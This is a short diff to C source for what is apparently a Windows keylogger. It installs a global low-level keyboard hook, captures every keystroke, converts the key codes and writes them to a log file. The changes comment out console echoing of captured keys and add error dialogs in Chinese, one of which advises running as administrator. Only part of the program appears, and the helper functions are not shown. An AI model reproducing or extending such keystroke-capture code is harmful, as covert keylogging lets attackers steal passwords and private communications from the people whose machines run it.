@@ -33,14 +33,14 @@ LRESULT CALLBACK kb_proc(int code, WPARAM w, LPARAM l)
 		hookConvertCode(log.sCode,p->vkCode);
 		logGetInfo(&log);
 		logWriteFile(log);
-		logPrintInfo(log);
+		//logPrintInfo(log);
 	}
 	return CallNextHookEx(g_hook, code, w, l);
 }
 
 int hookInit(){
 	g_hook = SetWindowsHookEx(WH_KEYBOARD_LL, &kb_proc, GetModuleHandle(NULL),0);	//设置全局低级键盘钩子
-	if (g_hook==NULL)return -1;
+	if (g_hook==NULL){MessageBox( 0, "设置全局钩子失败", "错误", 0 );exit(-1);}
 	return 0;
 }
 
@@ -63,6 +63,7 @@ void hookMessage(){
 
 void hookVirtualKey()
 {
+	if(logCheckFile()){MessageBox( 0, "文件不存在或无法创建，请尝试以管理员身份运行", "错误", 0 );exit(-1);}
 	hookInit();
 	hookMessage();
 	hookDestroy();
